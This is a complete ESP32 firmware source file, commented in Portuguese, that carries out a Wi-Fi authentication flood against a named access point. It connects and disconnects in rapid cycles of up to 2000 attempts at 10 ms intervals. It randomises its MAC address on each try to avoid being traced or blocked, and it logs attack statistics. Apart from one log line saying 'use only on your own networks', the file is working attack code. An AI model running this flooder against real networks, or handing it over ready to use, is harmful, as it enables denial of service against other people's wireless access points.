#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "esp_netif.h"
#include "esp_random.h"

// Configurações do AP alvo
#define TARGET_SSID "ESP32_AP"
#define TARGET_PASS "12345678"    // Senha correta para passar da auth

// Configurações do ataque de auth flood
#define AUTH_FLOOD_INTERVAL_MS 10    // Intervalo muito rápido entre tentativas
#define MAX_AUTH_ATTEMPTS 2000       // Máximo de tentativas de auth
#define RANDOMIZE_MAC_AUTH true      // Randomizar MAC para cada auth
#define DISCONNECT_AFTER_AUTH true   // Desconectar logo após auth bem-sucedida

static const char *TAG = "AUTH_FLOOD";
static EventGroupHandle_t s_wifi_event_group;

#define WIFI_CONNECTED_BIT BIT0
#define WIFI_FAIL_BIT      BIT1
#define WIFI_AUTH_SUCCESS_BIT BIT2

static int auth_attempts = 0;
static int auth_failures = 0;
static int auth_successes = 0;
static int disconnections = 0;

// Event handler para eventos do Wi-Fi
static void event_handler(void* arg, esp_event_base_t event_base,
                         int32_t event_id, void* event_data)
{
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
        ESP_LOGI(TAG, " Auth flood #%d - Iniciando autenticação", auth_attempts + 1);
        esp_wifi_connect();
        
    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_CONNECTED) {
        // Autenticação bem-sucedida - agora desconectar imediatamente para flood
        wifi_event_sta_connected_t* connected = (wifi_event_sta_connected_t*) event_data;
        auth_successes++;
        
        ESP_LOGI(TAG, " AUTH SUCESSO #%d - SSID: %s, Canal: %d", 
                 auth_attempts + 1, connected->ssid, connected->channel);
        ESP_LOGI(TAG, "   └─ Desconectando imediatamente para continuar flood...");
        
        // Desconectar imediatamente para sobrecarregar o AP
        if (DISCONNECT_AFTER_AUTH) {
            esp_wifi_disconnect();
            disconnections++;
        }
        
        xEventGroupSetBits(s_wifi_event_group, WIFI_AUTH_SUCCESS_BIT);
        
    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
        wifi_event_sta_disconnected_t* disconnected = (wifi_event_sta_disconnected_t*) event_data;
        
        // Verificar se foi falha na autenticação
        if (disconnected->reason == WIFI_REASON_AUTH_FAIL || 
            disconnected->reason == WIFI_REASON_AUTH_EXPIRE ||
            disconnected->reason == WIFI_REASON_NO_AP_FOUND) {
            auth_failures++;
            ESP_LOGI(TAG, " AUTH FALHA #%d - Motivo: %d", 
                     auth_attempts + 1, disconnected->reason);
        } else {
            ESP_LOGD(TAG, " Desconexão #%d - Motivo: %d", 
                     auth_attempts + 1, disconnected->reason);
        }
        
        xEventGroupSetBits(s_wifi_event_group, WIFI_FAIL_BIT);
        
    } else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        // IP obtido - desconectar imediatamente
        ip_event_got_ip_t* event = (ip_event_got_ip_t*) event_data;
        
        ESP_LOGI(TAG, " IP obtido: " IPSTR " - Desconectando para continuar flood", 
                 IP2STR(&event->ip_info.ip));
        
        esp_wifi_disconnect();
        xEventGroupSetBits(s_wifi_event_group, WIFI_CONNECTED_BIT);
    }
}

// Função para randomizar MAC address
void randomize_mac_for_auth(void)
{
    if (RANDOMIZE_MAC_AUTH) {
        uint8_t new_mac[6];
        
        // Gerar MAC aleatório mas realista
        uint8_t vendor_prefixes[][3] = {
            {0x02, 0x00, 0x00}, // Locally administered
            {0x02, 0x11, 0x22}, // Fake vendor
            {0x02, 0x33, 0x44}, // Fake vendor
            {0x02, 0x55, 0x66}, // Fake vendor
        };
        
        int vendor_idx = esp_random() % 4;
        memcpy(new_mac, vendor_prefixes[vendor_idx], 3);
        
        // Últimos 3 bytes aleatórios
        for (int i = 3; i < 6; i++) {
            new_mac[i] = esp_random() & 0xFF;
        }
        
        // Aplicar novo MAC
        esp_wifi_set_mac(WIFI_IF_STA, new_mac);
        
        ESP_LOGD(TAG, "MAC: %02x:%02x:%02x:%02x:%02x:%02x", 
                 new_mac[0], new_mac[1], new_mac[2], new_mac[3], new_mac[4], new_mac[5]);
    }
}

// Função para executar uma tentativa de auth flood
void execute_auth_flood_attempt(void)
{
    auth_attempts++;
    
    ESP_LOGI(TAG, " AUTH FLOOD #%d/%d", auth_attempts, MAX_AUTH_ATTEMPTS);
    
    // Randomizar MAC para cada tentativa
    randomize_mac_for_auth();
    
    // Parar Wi-Fi se estiver rodando
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(10)); // Delay mínimo
    
    // Configurar conexão
    wifi_config_t wifi_config = {
        .sta = {
            .ssid = TARGET_SSID,
            .password = TARGET_PASS,
            .threshold.authmode = WIFI_AUTH_WPA2_PSK,
            .pmf_cfg = {
                .capable = true,
                .required = false
            },
        },
    };
    
    esp_wifi_set_config(WIFI_IF_STA, &wifi_config);
    esp_wifi_start();
    
    // Aguardar resultado (timeout muito curto para flood rápido)
    EventBits_t bits = xEventGroupWaitBits(s_wifi_event_group,
            WIFI_CONNECTED_BIT | WIFI_FAIL_BIT | WIFI_AUTH_SUCCESS_BIT,
            pdTRUE, // Clear bits
            pdFALSE,
            pdMS_TO_TICKS(500)); // Timeout curto de 500ms
    
    if (!(bits & (WIFI_CONNECTED_BIT | WIFI_FAIL_BIT | WIFI_AUTH_SUCCESS_BIT))) {
        ESP_LOGI(TAG, " Timeout na tentativa #%d", auth_attempts);
        auth_failures++;
        esp_wifi_stop(); // Parar e tentar novamente
    }
}

// Função para mostrar estatísticas do auth flood
void show_auth_flood_stats(void)
{
    float success_rate = auth_attempts > 0 ? (float)auth_successes / auth_attempts * 100 : 0;
    float failure_rate = auth_attempts > 0 ? (float)auth_failures / auth_attempts * 100 : 0;
    
    ESP_LOGI(TAG, "");
    ESP_LOGI(TAG, "=== ESTATISTICAS DO AUTH FLOOD ===");
    ESP_LOGI(TAG, "Alvo: %s", TARGET_SSID);
    ESP_LOGI(TAG, "Tentativas de auth: %d", auth_attempts);
    ESP_LOGI(TAG, "Auth bem-sucedidas: %d (%.1f%%)", auth_successes, success_rate);
    ESP_LOGI(TAG, "Auth falhadas: %d (%.1f%%)", auth_failures, failure_rate);
    ESP_LOGI(TAG, "Desconexões forçadas: %d", disconnections);
    ESP_LOGI(TAG, "Taxa de ataque: ~%d auth/min", 60000 / AUTH_FLOOD_INTERVAL_MS);
    ESP_LOGI(TAG, "Randomização MAC: %s", RANDOMIZE_MAC_AUTH ? "ATIVA" : "INATIVA");
    ESP_LOGI(TAG, "=====================================");
    ESP_LOGI(TAG, "");
}

// Task principal do ataque auth flood
static void auth_flood_attack_task(void *pvParameters)
{
    ESP_LOGI(TAG, "");
    ESP_LOGI(TAG, " INICIANDO AUTH FLOOD ATTACK! ");
    ESP_LOGI(TAG, "Alvo: %s", TARGET_SSID);
    ESP_LOGI(TAG, "Intervalo: %d ms", AUTH_FLOOD_INTERVAL_MS);
    ESP_LOGI(TAG, "Máximo: %d tentativas", MAX_AUTH_ATTEMPTS);
    ESP_LOGI(TAG, "Estratégia: Conectar rápido + Desconectar = FLOOD");
    ESP_LOGI(TAG, "");
    
    while (auth_attempts < MAX_AUTH_ATTEMPTS) {
        execute_auth_flood_attempt();
        
        // Mostrar estatísticas a cada 50 tentativas
        if (auth_attempts % 50 == 0) {
            show_auth_flood_stats();
        }
        
        // Aguardar antes da próxima tentativa (interval muito pequeno)
        vTaskDelay(pdMS_TO_TICKS(AUTH_FLOOD_INTERVAL_MS));
    }
    
    ESP_LOGI(TAG, "");
    ESP_LOGI(TAG, " AUTH FLOOD ATTACK CONCLUÍDO!");
    show_auth_flood_stats();
    
    // Task finalizada
    vTaskDelete(NULL);
}

// Função para inicializar Wi-Fi para auth flood
void wifi_init_auth_flooder(void)
{
    s_wifi_event_group = xEventGroupCreate();

    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    
    esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    esp_event_handler_instance_t instance_any_id;
    esp_event_handler_instance_t instance_got_ip;
    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT,
                                                        ESP_EVENT_ANY_ID,
                                                        &event_handler,
                                                        NULL,
                                                        &instance_any_id));
    ESP_ERROR_CHECK(esp_event_handler_instance_register(IP_EVENT,
                                                        IP_EVENT_STA_GOT_IP,
                                                        &event_handler,
                                                        NULL,
                                                        &instance_got_ip));

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    
    ESP_LOGI(TAG, "Wi-Fi configurado para auth flood!");
}

void app_main(void)
{
    // Inicializar NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    ESP_LOGI(TAG, "");
    ESP_LOGI(TAG, "=== AUTH FLOOD ATTACKER INICIADO ===");
    ESP_LOGI(TAG, "ATENÇÃO: Programa de teste para demonstração!");
    ESP_LOGI(TAG, "Use apenas em redes próprias!");
    ESP_LOGI(TAG, "Preparando para sobrecarregar autenticação...");
    ESP_LOGI(TAG, "");
    
    // Inicializar Wi-Fi
    wifi_init_auth_flooder();
    
    // Aguardar antes de iniciar o ataque
    vTaskDelay(pdMS_TO_TICKS(2000));
    
    // Iniciar task de ataque
    xTaskCreate(auth_flood_attack_task, "auth_flood_task", 8192, NULL, 5, NULL);
    
    ESP_LOGI(TAG, "Sistema auth flood ativo!");
}